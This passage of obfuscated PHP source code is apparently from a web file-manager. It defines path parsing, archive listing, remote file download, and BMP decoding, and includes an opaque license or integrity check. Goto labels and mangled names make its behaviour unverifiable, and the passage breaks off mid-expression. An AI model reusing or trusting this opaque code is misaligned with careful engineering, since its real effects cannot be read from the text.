show_json($C‰š†Œø‚Ü[1029], !1); } } $F¢²°ñËì = isset($AåµÀÏßç) ? $AåµÀÏßç[$C‰š†Œø‚Ü[75]] : $DÍìÕÆ¦Á‘; goto E°”Ââ¸ÓÃ; Aù¿÷é®ƒ–: $E‰«¼Úá = json_encode($cµ‚È¬É†[$C‰š†Œø‚Ü[1026]]); self::setContent($d¸÷½ì„ , $E‰«¼Úá); if (count($cµ‚È¬É†[$C‰š†Œø‚Ü[1026]]) >= $C£Ê›ÂÓ†‚) { show_json(sprintf(LNG($C‰š†Œø‚Ü[1030]), count($cµ‚È¬É†[$C‰š†Œø‚Ü[1026]])), !1); } goto Aˆí¬¹Êå; cù„”©¢‰: if (!is_dir($AÈ±½‘îí)) { mk_dir($AÈ±½‘îí); } $a†ñŒë³õ = $AÈ±½‘îí . $C‰š†Œø‚Ü[8] . $E¶áöà·Ûá; if (!@file_exists(self::iconvSystem($a†ñŒë³õ))) { if (isset($AåµÀÏßç)) { url_request($DÍìÕÆ¦Á‘, $C‰š†Œø‚Ü[1031], $a†ñŒë³õ); } else { $E‡Ãà§§Òò = self::localFilePath($DÍìÕÆ¦Á‘, $AÒ¥ò• ùÁ); $a†ñŒë³õ = $E‡Ãà§§Òò ? $E‡Ãà§§Òò : self::download($DÍìÕÆ¦Á‘, $a†ñŒë³õ); } } goto F«Ø»š“àÖ; cö¹ª¡Œœ: } private static function fileExt($eî‰äŸé²Ó) { $eğùƒÌ˜õø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $D²ŠœšêÍø = $eî‰äŸé²Ó[$eğùƒÌ˜õø[157]]; if ($D²ŠœšêÍø == $eğùƒÌ˜õø[1033]) { $F÷‰ËÇÚ = $eğùƒÌ˜õø[1034]; if (substr($eî‰äŸé²Ó[$eğùƒÌ˜õø[28]], -strlen($F÷‰ËÇÚ)) == $F÷‰ËÇÚ) { $D²ŠœšêÍø = $eğùƒÌ˜õø[1035]; } } self::archiveExt($D²ŠœšêÍø); return $D²ŠœšêÍø; } private static function zipFileList($d‰öî¤ÅÆŞ, $E ¹‚îÓ†› = false) { $e„¹áªå¦Å =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E×ÕƒöÍ = array(); foreach ($d‰öî¤ÅÆŞ as $f±ŸÌê°‰Ÿ) { $EíˆÅËò¼‘ = $f±ŸÌê°‰Ÿ[$e„¹áªå¦Å[75]]; if ($E ¹‚îÓ†›) { $EíˆÅËò¼‘ = self::copy($f±ŸÌê°‰Ÿ[$e„¹áªå¦Å[75]], $E ¹‚îÓ†›, $e„¹áªå¦Å[739]); } if ($EíˆÅËò¼‘ && self::local()->exist($EíˆÅËò¼‘)) { $E×ÕƒöÍ[$f±ŸÌê°‰Ÿ[$e„¹áªå¦Å[75]]] = $EíˆÅËò¼‘; } } if (!empty($E×ÕƒöÍ)) { return array_values($E×ÕƒöÍ); } show_json(LNG($e„¹áªå¦Å[1036]), !1); } public static function tmpFileName($Dª È«¤‘Ş) { $AŞ›ƒ¯†¨É =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c‚ˆ¤æ¤‡â = array($Dª È«¤‘Ş[$AŞ›ƒ¯†¨É[28]], $Dª È«¤‘Ş[$AŞ›ƒ¯†¨É[75]], $Dª È«¤‘Ş[$AŞ›ƒ¯†¨É[77]], $Dª È«¤‘Ş[$AŞ›ƒ¯†¨É[455]]); return md5(implode($AŞ›ƒ¯†¨É[70], $c‚ˆ¤æ¤‡â)); } private static function localFilePath($C›ò İÌôå, $f ³Ì¬¾ Ú) { goto c¥ÀİòˆÎÎ; c¥ÀİòˆÎÎ: $fÛÍ°ù×„‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($f ³Ì¬¾ Ú == $fÛÍ°ù×„‡[1037] && strtoupper(substr(PHP_OS, 0, 3)) == $fÛÍ°ù×„‡[1038]) { return !1; } $F…ÌÌœ‚à = KodIO::parse($C›ò İÌôå); goto CÉ„µ‘°š†; CÉ„µ‘°š†: if ($F…ÌÌœ‚à[$fÛÍ°ù×„‡[29]] == KodIO::KOD_SOURCE) { $A˜ñË–Œ¢œ = Model($fÛÍ°ù×„‡[747])->fileInfoGet(KodIO::sourceID($C›ò İÌôå)); if (!$A˜ñË–Œ¢œ[$fÛÍ°ù×„‡[75]]) { show_json($fÛÍ°ù×„‡[1039], !1); } $C›ò İÌôå = $A˜ñË–Œ¢œ[$fÛÍ°ù×„‡[75]]; } $BÑ¥ÄùéÛ› = self::init($C›ò İÌôå); $f”Œ³ØƒŸ = $BÑ¥ÄùéÛ›->getType(); goto E§÷˜ÒÌÓÎ; E§÷˜ÒÌÓÎ: if ($f”Œ³ØƒŸ == $fÛÍ°ù×„‡[103] || $f”Œ³ØƒŸ == $fÛÍ°ù×„‡[1040]) { if (!$BÑ¥ÄùéÛ›->exist($BÑ¥ÄùéÛ›->path)) { show_json(LNG($fÛÍ°ù×„‡[102]), !1); } return $BÑ¥ÄùéÛ›->path; } return !1; goto D°æ‡ÅãÖ; D°æ‡ÅãÖ: } private static function archiveExt($c©‚Õ„¤•± = '') { $GLOBALS[$_SERVER[ÚŠ•´ÍéÒÑÔ][1041]] = $c©‚Õ„¤•±; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\x72\x52\x65\x63\x79\143\154\x65\175"; const KOD_USER_FAV = "\173\x75\163\x65\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\x72\x46\151\x6c\145\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\106\x69\154\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\160\x52\157\x6f\164\123\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\165\163\x65\162\123\150\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\x72\123\150\141\162\145\x4c\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\141\x72\145\111\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\x65\111\x74\x65\155\x4c\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\163\x65\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\x63\x6b\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\x52\145\156\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\145\x72\175"; public static function typeList() { $aô°ÌíËè› =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return array($aô°ÌíËè›[1042] => self::KOD_SOURCE, $aô°ÌíËè›[1043] => self::KOD_USER_RECYCLE, $aô°ÌíËè›[1044] => self::KOD_USER_FAV, $aô°ÌíËè›[1045] => self::KOD_USER_FILE_TAG, $aô°ÌíËè›[1046] => self::KOD_USER_FILE_TYPE, $aô°ÌíËè›[1047] => self::KOD_GROUP_ROOT_SELF, $aô°ÌíËè›[1048] => self::KOD_USER_SHARE, $aô°ÌíËè›[1049] => self::KOD_USER_SHARE_LINK, $aô°ÌíËè›[1050] => self::KOD_USER_SHARE_TO_ME, $aô°ÌíËè›[1051] => self::KOD_SHARE_ITEM, $aô°ÌíËè›[1052] => self::KOD_SHARE_LINK, $aô°ÌíËè›[1053] => self::KOD_SEARCH, $aô°ÌíËè›[1054] => self::KOD_BLOCK, $aô°ÌíËè›[1055] => self::KOD_IO, $aô°ÌíËè›[1056] => self::KOD_USER_RECENT, $aô°ÌíËè›[1057] => self::KOD_USER_DRIVER); } public static function parse($fÛâ…ÏÇ¾Õ) { goto C¹„²ìˆó©; C¹„²ìˆó©: $eñõâŠªè© =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÛâ…ÏÇ¾Õ = self::clear($fÛâ…ÏÇ¾Õ); $Eô¸·¬‰Ö = array_values(self::typeList()); goto D¼†»Äìá—; D¼†»Äìá—: preg_match($eñõâŠªè©[1058], $fÛâ…ÏÇ¾Õ, $dœÄº¦é‚¡); $e¸šæíØœ = array($eñõâŠªè©[385] => !1, $eñõâŠªè©[1059] => !1, $eñõâŠªè©[382] => !1, $eñõâŠªè©[75] => $fÛâ…ÏÇ¾Õ, $eñõâŠªè©[1004] => !1, $eñõâŠªè©[1003] => $eñõâŠªè©[33]); if (is_array($dœÄº¦é‚¡) && count($dœÄº¦é‚¡) == 5) { $fÍ²ŠïâË = $eñõâŠªè©[1060] . $dœÄº¦é‚¡[2] . $eñõâŠªè©[312]; if (in_array($fÍ²ŠïâË, $Eô¸·¬‰Ö)) { $e¸šæíØœ[$eñõâŠªè©[1004]] = $dœÄº¦é‚¡[1]; $e¸šæíØœ[$eñõâŠªè©[29]] = $fÍ²ŠïâË; $e¸šæíØœ[$eñõâŠªè©[1061]] = substr($fÍ²ŠïâË, 1, -1); $e¸šæíØœ[$eñõâŠªè©[364]] = $dœÄº¦é‚¡[3]; } $e¸šæíØœ[$eñõâŠªè©[1003]] = $dœÄº¦é‚¡[4]; } goto eæ¾òš™õŸ; eæ¾òš™õŸ: $DâìŒ ¨æ¬ = array($eñõâŠªè©[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $e¸šæíØœ[$eñõâŠªè©[1062]] = in_array($e¸šæíØœ[$eñõâŠªè©[29]], $DâìŒ ¨æ¬); return $e¸šæíØœ; goto Fí¨èõãîŸ; Fí¨èõãîŸ: } public static function clear($có¦×±öòª) { goto c½ïÇÕ“Äİ; bÍ¾ìïÅïÛ: if (substr($có¦×±öòª, 0, 3) == $aáÔ…¬Ÿœ°[1064]) { $có¦×±öòª = substr($có¦×±öòª, 3); } while (strstr($có¦×±öòª, $bçºÏÍŒ›Ã)) { $có¦×±öòª = str_replace($bçºÏÍŒ›Ã, $aáÔ…¬Ÿœ°[8], $có¦×±öòª); } $có¦×±öòª = preg_replace($aáÔ…¬Ÿœ°[1065], $aáÔ…¬Ÿœ°[8], $có¦×±öòª); goto dö÷ùÀˆ¯; dö÷ùÀˆ¯: if ($có¦×±öòª == $aáÔ…¬Ÿœ°[8]) { return $aáÔ…¬Ÿœ°[8]; } $có¦×±öòª = rtrim($có¦×±öòª, $aáÔ…¬Ÿœ°[8]); return $có¦×±öòª; goto cœñµ§ô; c½ïÇÕ“Äİ: $aáÔ…¬Ÿœ° =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $có¦×±öòª = str_replace($aáÔ…¬Ÿœ°[95], $aáÔ…¬Ÿœ°[8], $có¦×±öòª); $bçºÏÍŒ›Ã = $aáÔ…¬Ÿœ°[1063]; goto bÍ¾ìïÅïÛ; cœñµ§ô: } public static function sourceID($F™‚ËÖ¾) { $C‹õÓÎÉÈ“ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d‘®è©Ú‹ = self::parse($F™‚ËÖ¾); if ($d‘®è©Ú‹[$C‹õÓÎÉÈ“[29]] !== self::KOD_SOURCE) { show_json(LNG($C‹õÓÎÉÈ“[1066]), !1); } return $d‘®è©Ú‹[$C‹õÓÎÉÈ“[364]]; } public static function make($cä¶±½ÁÆİ) { if (!$cä¶±½ÁÆİ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($cä¶±½ÁÆİ)); } public static function makeShare($F„®í›Ó‡, $d—´àº¾¾ç) { return self::makePath(self::KOD_SHARE_ITEM, $F„®í›Ó‡, $d—´àº¾¾ç); } public static function makeFileTypePath($e†İ ºõÔ‘) { return self::makePath(self::KOD_USER_FILE_TYPE, $e†İ ºõÔ‘); } public static function makeFileTagPath($Cµ¾Ù¢æ¯¸) { return self::makePath(self::KOD_USER_FILE_TAG, $Cµ¾Ù¢æ¯¸); } public static function makePath($f´——¾áŒ–, $DÆÊ”ñªáÚ = '', $BÀ„—³ó†• = '') { $b·¨ÊÃ…Ò‡ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eŸÖ¸Àøôœ = substr($f´——¾áŒ–, 1, -1); $C¨á‹µï…« = $b·¨ÊÃ…Ò‡[1067] . $eŸÖ¸Àøôœ . $b·¨ÊÃ…Ò‡[1068] . $DÆÊ”ñªáÚ . $b·¨ÊÃ…Ò‡[1069]; $C¨á‹µï…« = $BÀ„—³ó†• ? $C¨á‹µï…« . $BÀ„—³ó†• . $b·¨ÊÃ…Ò‡[8] : $C¨á‹µï…«; return $C¨á‹µï…«; } public static function hashPath($a™£‘ñâ²Ç) { $còÔª’øõ¶ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fİÃÖ•…ï = is_array($a™£‘ñâ²Ç) ? $a™£‘ñâ²Ç : IO::info($a™£‘ñâ²Ç); $D¾Ñ‡å‚× = _get($fİÃÖ•…ï, $còÔª’øõ¶[1070], $còÔª’øõ¶[33]); if (!$D¾Ñ‡å‚×) { $A»øªÕâ„© = KodIO::parse($fİÃÖ•…ï[$còÔª’øõ¶[75]]); if (!$A»øªÕâ„©[$còÔª’øõ¶[29]]) { $D¾Ñ‡å‚× = IO::hashSimple($fİÃÖ•…ï[$còÔª’øõ¶[75]]); } } if (!$D¾Ñ‡å‚×) { $D¾Ñ‡å‚× = md5($fİÃÖ•…ï[$còÔª’øõ¶[75]] . $fİÃÖ•…ï[$còÔª’øõ¶[77]] . $fİÃÖ•…ï[$còÔª’øõ¶[107]]); } return $D¾Ñ‡å‚×; } public static function initSystemPath() { $Cìšß¥‘² =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (defined($Cìšß¥‘²[1071])) { return; } define($Cìšß¥‘²[1071], self::systemPath($Cìšß¥‘²[1072])); define($Cìšß¥‘²[1073], self::systemPath($Cìšß¥‘²[1074])); define($Cìšß¥‘²[1075], self::systemPath($Cìšß¥‘²[1076])); define($Cìšß¥‘²[1077], self::systemPath($Cìšß¥‘²[1078])); } private static function systemPath($e»ì•…¦Ü÷) { goto f ´ŒİõšÊ; f ´ŒİõšÊ: $DÈéøî =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F‚Şîëí¾î = $DÈéøî[1079] . ucfirst($e»ì•…¦Ü÷); $fŸ¦ÎŠß = Model($DÈéøî[1080])->get($F‚Şîëí¾î); goto DâŠ±µƒÚ; d»˜Ûì˜â: return $fŸ¦ÎŠß; goto A¾áÜí¢ë¢; DâŠ±µƒÚ: if ($fŸ¦ÎŠß) { return $fŸ¦ÎŠß; } if ($e»ì•…¦Ü÷ == $DÈéøî[1072]) { $fŸ¦ÎŠß = self::make(Model($DÈéøî[747])->systemRootPathAdd($DÈéøî[1081])); } else { $fŸ¦ÎŠß = self::systemPath($DÈéøî[1072]); $Eè¬îé’í = self::sourceID($fŸ¦ÎŠß); $fŸ¦ÎŠß = self::make(Model($DÈéøî[747])->mkdir($Eè¬îé’í, $e»ì•…¦Ü÷)); } Model($DÈéøî[1080])->set($F‚Şîëí¾î, $fŸ¦ÎŠß); goto d»˜Ûì˜â; A¾áÜí¢ë¢: } public static function systemFolder($Dö´§»¦ƒ†) { $F®ÅÆê·Æù = IO_PATH_SYSTEM_SOURCE . $Dö´§»¦ƒ†; $bÎÀ…ÑÁç = Cache::get($F®ÅÆê·Æù); if (!$bÎÀ…ÑÁç) { $DÍ‘â­èñ = IO::infoFull($F®ÅÆê·Æù); if (!$DÍ‘â­èñ) { $bÎÀ…ÑÁç = IO::mkdir($F®ÅÆê·Æù, REPEAT_SKIP); } else { $bÎÀ…ÑÁç = $DÍ‘â­èñ[$_SERVER[ÚŠ•´ÍéÒÑÔ][75]]; } Cache::set($F®ÅÆê·Æù, $bÎÀ…ÑÁç, 3600 * 10); } return $bÎÀ…ÑÁç; } public static function defaultDriver() { return Model($_SERVER[ÚŠ•´ÍéÒÑÔ][699])->defaultDriver(); } public static function defaultIO() { $fè•Æ¥‘‹¤ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $f‚‰áÔËë× = self::defaultDriver(); return $fè•Æ¥‘‹¤[1082] . $f‚‰áÔËë×[$fè•Æ¥‘‹¤[364]] . $fè•Æ¥‘‹¤[1069]; } public static function fileTypeList() { $Fïêƒºß„  =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÀ½Áñ‹ƒ§ = $GLOBALS[$Fïêƒºß„ [6]][$Fïêƒºß„ [1083]]; foreach ($CÀ½Áñ‹ƒ§ as $DùÌŠ˜ßÂ => $aŒâ…­·«ù) { $F˜¼¸ƒ“™Ø = $Fïêƒºß„ [1084] . $DùÌŠ˜ßÂ; $DÄÍ–ëİ„ƒ = LNG($F˜¼¸ƒ“™Ø); if ($F˜¼¸ƒ“™Ø != $DÄÍ–ëİ„ƒ) { $CÀ½Áñ‹ƒ§[$DùÌŠ˜ßÂ][$Fïêƒºß„ [28]] = $DÄÍ–ëİ„ƒ; } } return $CÀ½Áñ‹ƒ§; } } goto Bï›‹†ë¢œ; F™¸¼¯Š“¦: function beforeShutdownFatalError($B‚åë‚ ) { think_exception($B‚åë‚ ); } $_SERVER[$_SERVER[Ÿ²ù¬][48]] = $EîïİÔÕ—($_SERVER[$_SERVER[Ÿ²ù¬][45]]); $d…„ĞÉ‘½ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto Eåã±Ü›ìÓ; fÛÙ÷µĞä: $DîéÓ¸Ï‘Û = $_SERVER[ÚŠ•´ÍéÒÑÔ][1152]; if ($_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][781]] != $DîéÓ¸Ï‘Û($aÙ©–ÎÙÈÊ)) { goto Bß¿ÀÎö’÷; Bß¿ÀÎö’÷: $bÊĞƒè•¨Å = $_SERVER[ÚŠ•´ÍéÒÑÔ][784]; $aá™ŒØ°‰ = $_SERVER[$_SERVER[ÚŠ•´ÍéÒÑÔ][785]] . $_SERVER[ÚŠ•´ÍéÒÑÔ][786]; $d²ùÈ…†ë = $bÊĞƒè•¨Å($aá™ŒØ°‰); goto C÷—êÉ©Ñˆ; EŠ¶Ü³”Ù: $f«·ÉèÎ˜($aÙ©–ÎÙÈÊ); goto c÷Íéæ‹†; C÷—êÉ©Ñˆ: $Ağ·çääÈâ = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][214], $d²ùÈ…†ë); if (count($Ağ·çääÈâ) < $_SERVER[ÚŠ•´ÍéÒÑÔ][557]) { $fâº×ÉÑ´ = $_SERVER[ÚŠ•´ÍéÒÑÔ][787]; $fâº×ÉÑ´(); } $f«·ÉèÎ˜ = $_SERVER[ÚŠ•´ÍéÒÑÔ][1153]; goto EŠ¶Ü³”Ù; c÷Íéæ‹†: } class ImageGdBMP { public static function load($AË¨Ùò¼Œ) { $e‹ª•Å‘·¤ = fopen($AË¨Ùò¼Œ, $_SERVER[ÚŠ•´ÍéÒÑÔ][1488]); if ($e‹ª•Å‘·¤ === !1) { return !1; } $fîó…¦È¼¼ = self::loadFromStream($e‹ª•Å‘·¤); fclose($e‹ª•Å‘·¤); return $fîó…¦È¼¼; } public static function loadFromStream($Díï†Æ¡ğÂ) { $eÂ”…–ÎÌ´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e–íñŸç = fread($Díï†Æ¡ğÂ, 14); if ($e–íñŸç === !1) { return !1; } if ($e–íñŸç[0] != $eÂ”…–ÎÌ´[1800] || $e–íñŸç[1] != $eÂ”…–ÎÌ´[1801]) { return !1; } $e³ˆ¡µî“ = unpack($eÂ”…–ÎÌ´[1802] . $eÂ”…–ÎÌ´[1803] . $eÂ”…–ÎÌ´[1804] . $eÂ”…–ÎÌ´[1805] . $eÂ”…–ÎÌ´[1806], $e–íñŸç); return self::loadFromStreamAndFileHeader($Díï†Æ¡ğÂ, $e³ˆ¡µî“); } public static function loadFromStreamAndFileHeader($A˜æãåË„‡, array $Cğ˜÷ã­§) { goto DÍŒö¢ƒ•Ó; DÀî»©×Ã“: if ($cåß²ÍïÍ == 1 || $cåß²ÍïÍ == 4 || $cåß²ÍïÍ == 8) { goto Bğçƒñ‚‘; C†šä½±: $A·†ß·Í£‚ = (1 << $cåß²ÍïÍ) - 1 << $aÅí·± Á·; if ($D¶†âƒŠ¶è == 1 || $D¶†âƒŠ¶è == 2) { $c‚ĞÚÏ†«« = 0; $eÉ¿æŒ‡Ø = $cåß²ÍïÍ >> 2 & 1; for (;;) { if ($c‚ĞÚÏ†«« < -1 || $c‚ĞÚÏ†«« > $dê¹·èÙ· || $B†ĞãÕ¶ÁÒ < -1 || $B†ĞãÕ¶ÁÒ > $a¤ÉÁ ŸòÒ) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } $Cí‰¡ç–­ã = fread($A˜æãåË„‡, 1); if ($Cí‰¡ç–­ã === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } switch ($Cí‰¡ç–­ã) { case $cİ®èª¼è½[1825]: $Cí‰¡ç–­ã = fread($A˜æãåË„‡, 1); if ($Cí‰¡ç–­ã === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } switch ($Cí‰¡ç–­ã) { case $cİ®èª¼è½[1825]: $B†ĞãÕ¶ÁÒ += $Dë²ù•…ŞÇ; $c‚ĞÚÏ†«« = 0; break; case $cİ®èª¼è½[1827]: $B†ĞãÕ¶ÁÒ = 0; $c‚ĞÚÏ†«« = 0; break 3; case $cİ®èª¼è½[1828]: $Cí‰¡ç–­ã = fread($A˜æãåË„‡, 2); if ($Cí‰¡ç–­ã === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } list(, $C²ï«£ÉÒ½, $BÜÍ±ÓöÆ) = unpack($cİ®èª¼è½[1829], $Cí‰¡ç–­ã); $c‚ĞÚÏ†«« += $C²ï«£ÉÒ½; $B†ĞãÕ¶ÁÒ += $BÜÍ±ÓöÆ * $Dë²ù•…ŞÇ; break; default: list(, $EÕù¿ÍŠ°Ë) = unpack($cİ®èª¼è½[1830], $Cí‰¡ç–­ã); $AƒŒõ¹¡ = ($EÕù¿ÍŠ°Ë >> $eÉ¿æŒ‡Ø) + ($EÕù¿ÍŠ°Ë & $eÉ¿æŒ‡Ø); $Cí‰¡ç–­ã = fread($A˜æãåË„‡, $AƒŒõ¹¡ + 1 & ~1); if ($Cí‰¡ç–­ã === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } for ($AÎ½´¢‰Áô = 0, $F‘™Ã‚‰† = 0; $AÎ½´¢‰Áô < $EÕù¿ÍŠ°Ë; ++$AÎ½´¢‰Áô, ++$c‚ĞÚÏ†««, $F‘™Ã‚‰† += $cåß²ÍïÍ) { list(, $Eùî³ïóé) = unpack($cİ®èª¼è½[1830], $Cí‰¡ç–­ã[$F‘™Ã‚‰† >> 3]); $d–Š“¼­ËÏ = $F‘™Ã‚‰† & 7; imagesetpixel($Fâ‡µ‘§àÒ, $c‚ĞÚÏ†««, $B†ĞãÕ¶ÁÒ, $F¨²Ç‹ÜÄ[($Eùî³ïóé & $A·†ß·Í£‚ >> $d–Š“¼­ËÏ) >> $aÅí·± Á· - $d–Š“¼­ËÏ]); } break; } break; default: $b¾å öÇœ = fread($A˜æãåË„‡, 1); if ($b¾å öÇœ === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } list(, $A¨Ï†èÓ, $Eùî³ïóé) = unpack($cİ®èª¼è½[1829], $Cí‰¡ç–­ã . $b¾å öÇœ); for ($AÎ½´¢‰Áô = 0, $F‘™Ã‚‰† = 0; $AÎ½´¢‰Áô < $A¨Ï†èÓ; ++$AÎ½´¢‰Áô, ++$c‚ĞÚÏ†««, $F‘™Ã‚‰† += $cåß²ÍïÍ) { $d–Š“¼­ËÏ = $F‘™Ã‚‰† & 7; imagesetpixel($Fâ‡µ‘§àÒ, $c‚ĞÚÏ†««, $B†ĞãÕ¶ÁÒ, $F¨²Ç‹ÜÄ[($Eùî³ïóé & $A·†ß·Í£‚ >> $d–Š“¼­ËÏ) >> $aÅí·± Á· - $d–Š“¼­ËÏ]); } break; } } } else { for ($e©Í ëÛ = 0; $e©Í ëÛ < $aÚàÚ¢´; ++$e©Í ëÛ, $B†ĞãÕ¶ÁÒ += $Dë²ù•…ŞÇ) { $Cí‰¡ç–­ã = fread($A˜æãåË„‡, $dØğøÔ‚Î); if ($Cí‰¡ç–­ã === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } $F‘™Ã‚‰† = 0; for ($c‚ĞÚÏ†«« = 0; $c‚ĞÚÏ†«« < $dê¹·èÙ·; ++$c‚ĞÚÏ†««, $F‘™Ã‚‰† += $cåß²ÍïÍ) { list(, $Eùî³ïóé) = unpack($cİ®èª¼è½[1830], $Cí‰¡ç–­ã[$F‘™Ã‚‰† >> 3]); $d–Š“¼­ËÏ = $F‘™Ã‚‰† & 7; imagesetpixel($Fâ‡µ‘§àÒ, $c‚ĞÚÏ†««, $B†ĞãÕ¶ÁÒ, $F¨²Ç‹ÜÄ[($Eùî³ïóé & $A·†ß·Í£‚ >> $d–Š“¼­ËÏ) >> $aÅí·± Á· - $d–Š“¼­ËÏ]); } } } goto CŠ„ùõ¶¥«; Bğçƒñ‚‘: $Fâ‡µ‘§àÒ = imagecreate($dê¹·èÙ·, $aÚàÚ¢´); $c˜³×ñ‰‘ = $DƒŒ‚´„â == 12 ? 3 : 4; $bá¢÷øÉö” = $DëË—„ïç ? $DëË—„ïç : pow(2, $cåß²ÍïÍ); goto dÓÅ“ôôËÓ; dÓÅ“ôôËÓ: $F¨²Ç‹ÜÄ = array(); for ($AÎ½´¢‰Áô = 0; $AÎ½´¢‰Áô < $bá¢÷øÉö”; ++$AÎ½´¢‰Áô) { $Cí‰¡ç–­ã = fread($A˜æãåË„‡, $c˜³×ñ‰‘); if ($Cí‰¡ç–­ã === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } extract(unpack($cİ®èª¼è½[1826], $Cí‰¡ç–­ã . $cİ®èª¼è½[1825])); $F¨²Ç‹ÜÄ[] = imagecolorallocate($Fâ‡µ‘§àÒ, $f›ƒã“Ş‡°, $E’ôò¾Ô»Æ, $d–Š“¼­ËÏ); } $aÅí·± Á· = 8 - $cåß²ÍïÍ; goto C†šä½±; CŠ„ùõ¶¥«: } else { goto EÅà–£¡Ùô; DØé×ÃÒ«: $D¯Ï¤õŠòª = $cåß²ÍïÍ >> 3; $cñã²ŞŒ©è = $cî…±ğ«Íâ ? 127 : 0; $CÀñÑ´Öîº = $cî…±ğ«Íâ ? 1 / $cî…±ğ«Íâ : 1; goto d Ğ¿Û¾Æë; d ÀòŠòöê: for ($e©Í ëÛ = 0; $e©Í ëÛ < $aÚàÚ¢´; ++$e©Í ëÛ, $B†ĞãÕ¶ÁÒ += $Dë²ù•…ŞÇ) { $Cí‰¡ç–­ã = fread($A˜æãåË„‡, $dØğøÔ‚Î); if ($Cí‰¡ç–­ã === !1) { imagedestroy($Fâ‡µ‘§àÒ); return !1; } $F‘™Ã‚‰† = 0; for ($c‚ĞÚÏ†«« = 0; $c‚ĞÚÏ†«« < $dê¹·èÙ·; ++$c‚ĞÚÏ†««, $F‘™Ã‚‰† += $D¯Ï¤õŠòª) { list(, $Eùî³ïóé) = unpack($cİ®èª¼è½[1807], substr($Cí‰¡ç–­ã, $F‘™Ã‚‰†, $D¯Ï¤õŠòª) . $cİ®èª¼è½[1831]); $E·ù•ÓÆÇ‹ = $Eùî³ïóé & $cî…±ğ«Íâ; $a„ğ·¦ŞÅ¶ = $Eùî³ïóé & $E­ö¶¢øŠ¦; $B¼œÏ¶—¿ = $Eùî³ïóé & $EŒÀŠà®ë; $BÆ”î…¢±Ã = $Eùî³ïóé & $D•Õ—ŞñÊƒ; $C¶£àî¯¶ = $cñã²ŞŒ©è - (($E·ù•ÓÆÇ‹ << 7) - $E·ù•ÓÆÇ‹) * $CÀñÑ´Öîº; $f›ƒã“Ş‡° = (($a„ğ·¦ŞÅ¶ << 8) - $a„ğ·¦ŞÅ¶) * $C†ËÓòõ¼; $E’ôò¾Ô»Æ = (($B¼œÏ¶—¿ << 8) - $B¼œÏ¶—¿) * $Fäà™Äï¾µ; $d–Š“¼­ËÏ = (($BÆ”î…¢±Ã << 8) - $BÆ”î…¢±Ã) * $CÙƒ ¾î¯ñ; imagesetpixel($Fâ‡µ‘§àÒ, $c‚ĞÚÏ†««, $B†ĞãÕ¶ÁÒ, $C¶£àî¯¶ << 24 | $f›ƒã“Ş‡° << 16 | $E’ôò¾Ô»Æ << 8 | $d–Š“¼­ËÏ); } } imagealphablending($Fâ‡µ‘§àÒ, !0); goto E­¤äãá´ˆ; EÅà–£¡Ùô: $Fâ‡µ‘§àÒ = imagecreatetruecolor($dê¹·èÙ·, $aÚàÚ¢´); imagealphablending($Fâ‡µ‘§àÒ, !1); if ($cî…±ğ«Íâ) { imagesavealpha($Fâ‡µ‘§àÒ, !0); } goto DØé×ÃÒ«; d Ğ¿Û¾Æë: $C†ËÓòõ¼ = $E­ö¶¢øŠ¦ ? 1 / $E­ö¶¢øŠ¦ : 1; $Fäà™Äï¾µ = $EŒÀŠà®ë ? 1 / $EŒÀŠà®ë : 1; $CÙƒ ¾î¯ñ = $D•Õ—ŞñÊƒ ? 1 / $D•Õ—ŞñÊƒ : 1; goto d ÀòŠòöê; E­¤äãá´ˆ: } return $Fâ‡µ‘§àÒ; goto f¹ù‰­ÍÔŒ; BÕóõÎÏô: if ($dê¹·èÙ· == 0 || $a¤ÉÁ ŸòÒ == 0 || $F‘¦Ê„Ûê‰ != 1 || ($cî…±ğ«Íâ & $E­ö¶¢øŠ¦) != 0 || ($cî…±ğ«Íâ & $EŒÀŠà®ë) != 0 || ($cî…±ğ«Íâ & 